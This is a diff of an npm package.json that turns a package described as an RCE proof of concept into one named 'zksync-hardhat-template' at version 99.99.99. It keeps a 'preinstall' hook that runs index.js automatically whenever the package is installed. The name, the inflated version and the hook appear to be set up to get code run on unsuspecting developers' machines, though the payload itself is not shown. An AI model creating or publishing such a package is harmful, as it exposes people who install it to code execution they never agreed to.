@@ -1,12 +1,13 @@
 {
-  "name": "extension-image",
-  "version": "213.21.24",
-  "description": "PoC for pottential RCE",
+  "name": "zksync-hardhat-template",
+  "version": "99.99.99",
+  "description": "Test package",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: exzuperi made me\" && exit 1",
+    "test": "echo \"Error: no test specified\" && exit 1",
     "preinstall": "node index.js"
   },
-  "author": "",
+  "author": "Karal",
   "license": "ISC"
 }
+
